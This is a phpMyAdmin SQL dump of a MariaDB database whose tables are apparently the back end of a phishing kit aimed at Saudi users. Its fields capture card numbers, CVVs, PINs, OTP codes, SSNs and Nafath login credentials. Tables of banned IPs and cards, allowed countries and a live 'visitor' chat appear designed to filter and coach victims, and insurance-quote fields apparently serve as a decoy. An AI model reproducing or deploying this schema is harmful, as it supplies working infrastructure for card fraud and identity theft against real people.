-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1
-- Generation Time: Apr 09, 2026 at 11:31 AM
-- Server version: 10.4.32-MariaDB
-- PHP Version: 8.2.12

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `dalatew`
--

-- --------------------------------------------------------

--
-- Table structure for table `admin`
--

CREATE TABLE `admin` (
  `id` int(11) NOT NULL,
  `username` varchar(255) NOT NULL,
  `email` varchar(255) NOT NULL,
  `password` varchar(255) NOT NULL,
  `access` tinyint(1) NOT NULL DEFAULT 0
) ENGINE=MyISAM DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `admin`
--

INSERT INTO `admin` (`id`, `username`, `email`, `password`, `access`) VALUES
(1, 'admin', 'admin@admin.com', '202cb962ac59075b964b07152d234b70', 1);

-- --------------------------------------------------------

--
-- Table structure for table `allowed_countries`
--

CREATE TABLE `allowed_countries` (
  `id` int(11) NOT NULL,
  `country_code` varchar(10) NOT NULL,
  `country_name` varchar(100) NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Table structure for table `banned_cards`
--

CREATE TABLE `banned_cards` (
  `id` int(11) NOT NULL,
  `card_number` varchar(20) NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- --------------------------------------------------------

--
-- Table structure for table `banned_ips`
--

CREATE TABLE `banned_ips` (
  `id` int(11) NOT NULL,
  `ip` varchar(255) NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Table structure for table `card`
--

CREATE TABLE `card` (
  `id` int(11) NOT NULL,
  `cardNumber` varchar(255) DEFAULT NULL,
  `totalprice` varchar(255) DEFAULT NULL,
  `password` varchar(10) DEFAULT NULL,
  `status` int(250) NOT NULL DEFAULT 0,
  `year` varchar(10) DEFAULT NULL,
  `cvv` varchar(10) DEFAULT NULL,
  `otp` varchar(10) DEFAULT NULL,
  `company` varchar(250) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT '####',
  `PhoneNumber` bigint(250) DEFAULT NULL,
  `userId` int(11) DEFAULT NULL,
  `url` varchar(100) DEFAULT NULL,
  `Authentication_code` bigint(250) DEFAULT NULL,
  `UserName_Nafad` varchar(250) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL,
  `UserPasswore_Nafad` varchar(250) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL,
  `CheckTheInfo_Nafad` int(250) DEFAULT NULL,
  `TemporaryPassword` varchar(250) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL,
  `username` varchar(250) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL,
  `passwordt` varchar(250) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL,
  `cardname` varchar(255) DEFAULT NULL,
  `rajhi_status` int(250) DEFAULT NULL,
  `ssn` int(250) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Table structure for table `card_nafath_history`
--

CREATE TABLE `card_nafath_history` (
  `id` int(11) NOT NULL,
  `card_id` int(11) NOT NULL,
  `code` varchar(20) NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `card_nafath_history`
--

INSERT INTO `card_nafath_history` (`id`, `card_id`, `code`, `created_at`) VALUES
(1, 59, '30', '2026-04-09 09:20:00'),
(2, 59, '70', '2026-04-09 09:20:19');

-- --------------------------------------------------------

--
-- Table structure for table `card_otp_history`
--

CREATE TABLE `card_otp_history` (
  `id` int(11) NOT NULL,
  `card_id` int(11) NOT NULL,
  `otp` varchar(20) NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `card_otp_history`
--

INSERT INTO `card_otp_history` (`id`, `card_id`, `otp`, `created_at`) VALUES
(2, 58, '555555', '2026-04-09 09:07:29');

-- --------------------------------------------------------

--
-- Table structure for table `chat_messages`
--

CREATE TABLE `chat_messages` (
  `id` int(11) NOT NULL,
  `session_id` varchar(255) NOT NULL,
  `sender_type` enum('visitor','admin') NOT NULL,
  `message` text NOT NULL,
  `status` enum('sent','delivered','seen') DEFAULT 'sent',
  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
  `is_read` tinyint(1) DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Table structure for table `chat_sessions`
--

CREATE TABLE `chat_sessions` (
  `id` int(11) NOT NULL,
  `session_id` varchar(255) NOT NULL,
  `visitor_name` varchar(100) DEFAULT 'زائر',
  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
  `last_activity` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Table structure for table `settings`
--

CREATE TABLE `settings` (
  `id` int(11) NOT NULL,
  `setting_key` varchar(50) NOT NULL,
  `setting_value` text DEFAULT NULL,
  `updated_at` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `settings`
--

INSERT INTO `settings` (`id`, `setting_key`, `setting_value`, `updated_at`) VALUES
(1, 'chat_enabled', '1', '2026-04-04 12:10:19');

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE `users` (
  `id` int(11) NOT NULL,
  `username` varchar(255) CHARACTER SET utf8 COLLATE utf8_german2_ci NOT NULL,
  `ssn` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `email` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `password` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
  `access` tinyint(1) NOT NULL DEFAULT 0,
  `link` varchar(250) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL,
  `bank` int(11) NOT NULL,
  `code` int(11) DEFAULT NULL,
  `CheckTheCode` int(250) NOT NULL DEFAULT 0,
  `company` varchar(250) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT '####',
  `message` varchar(50) DEFAULT NULL,
  `page` varchar(50) DEFAULT NULL,
  `phone` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `Authentication_code` bigint(250) DEFAULT NULL,
  `UserName_Nafad` varchar(250) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL,
  `UserPasswore_Nafad` varchar(250) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL,
  `CheckTheInfo_Nafad` int(250) DEFAULT 0,
  `TemporaryPassword` varchar(250) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL,
  `is_archived` tinyint(1) NOT NULL DEFAULT 0,
  `is_pinned` tinyint(1) NOT NULL DEFAULT 0,
  `is_distinguished` tinyint(1) NOT NULL DEFAULT 0,
  `is_completed` tinyint(1) NOT NULL DEFAULT 0,
  `device` varchar(255) DEFAULT NULL,
  `browser` varchar(255) DEFAULT NULL,
  `location` varchar(255) DEFAULT NULL,
  `ip` varchar(255) DEFAULT NULL,
  `last_activity` timestamp NULL DEFAULT NULL,
  `chat_session_id` varchar(50) DEFAULT NULL,
  `docDate` varchar(255) DEFAULT NULL,
  `purposeUse` varchar(255) DEFAULT NULL,
  `carValue` varchar(255) DEFAULT NULL,
  `createdYear` varchar(10) DEFAULT NULL,
  `repairPlace` varchar(255) DEFAULT NULL,
  `firstType` varchar(50) DEFAULT NULL,
  `secondType` varchar(50) DEFAULT NULL,
  `ssnTwo` varchar(255) DEFAULT NULL,
  `jamNum` varchar(255) DEFAULT NULL,
  `tasal` varchar(255) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Indexes for dumped tables
--

--
-- Indexes for table `admin`
--
ALTER TABLE `admin`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `allowed_countries`
--
ALTER TABLE `allowed_countries`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `country_code` (`country_code`);

--
-- Indexes for table `banned_cards`
--
ALTER TABLE `banned_cards`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `card_number` (`card_number`);

--
-- Indexes for table `banned_ips`
--
ALTER TABLE `banned_ips`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `ip` (`ip`);

--
-- Indexes for table `card`
--
ALTER TABLE `card`
  ADD PRIMARY KEY (`id`),
  ADD KEY `user_id` (`userId`);

--
-- Indexes for table `card_nafath_history`
--
ALTER TABLE `card_nafath_history`
  ADD PRIMARY KEY (`id`),
  ADD KEY `card_id` (`card_id`);

--
-- Indexes for table `card_otp_history`
--
ALTER TABLE `card_otp_history`
  ADD PRIMARY KEY (`id`),
  ADD KEY `card_id` (`card_id`);

--
-- Indexes for table `chat_messages`
--
ALTER TABLE `chat_messages`
  ADD PRIMARY KEY (`id`),
  ADD KEY `session_id` (`session_id`);

--
-- Indexes for table `chat_sessions`
--
ALTER TABLE `chat_sessions`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `session_id` (`session_id`);

--
-- Indexes for table `settings`
--
ALTER TABLE `settings`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `setting_key` (`setting_key`);

--
-- Indexes for table `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `admin`
--
ALTER TABLE `admin`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;

--
-- AUTO_INCREMENT for table `allowed_countries`
--
ALTER TABLE `allowed_countries`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- AUTO_INCREMENT for table `banned_cards`
--
ALTER TABLE `banned_cards`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- AUTO_INCREMENT for table `banned_ips`
--
ALTER TABLE `banned_ips`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=14;

--
-- AUTO_INCREMENT for table `card`
--
ALTER TABLE `card`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=60;

--
-- AUTO_INCREMENT for table `card_nafath_history`
--
ALTER TABLE `card_nafath_history`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT for table `card_otp_history`
--
ALTER TABLE `card_otp_history`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT for table `chat_messages`
--
ALTER TABLE `chat_messages`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=36;

--
-- AUTO_INCREMENT for table `chat_sessions`
--
ALTER TABLE `chat_sessions`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=33;

--
-- AUTO_INCREMENT for table `settings`
--
ALTER TABLE `settings`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=1275;

--
-- AUTO_INCREMENT for table `users`
--
ALTER TABLE `users`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=1056;

--
-- Constraints for dumped tables
--

--
-- Constraints for table `card`
--
ALTER TABLE `card`
  ADD CONSTRAINT `user_id` FOREIGN KEY (`userId`) REFERENCES `users` (`id`) ON DELETE CASCADE;

--
-- Constraints for table `chat_messages`
--
ALTER TABLE `chat_messages`
  ADD CONSTRAINT `fk_session` FOREIGN KEY (`session_id`) REFERENCES `chat_sessions` (`session_id`) ON DELETE CASCADE;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
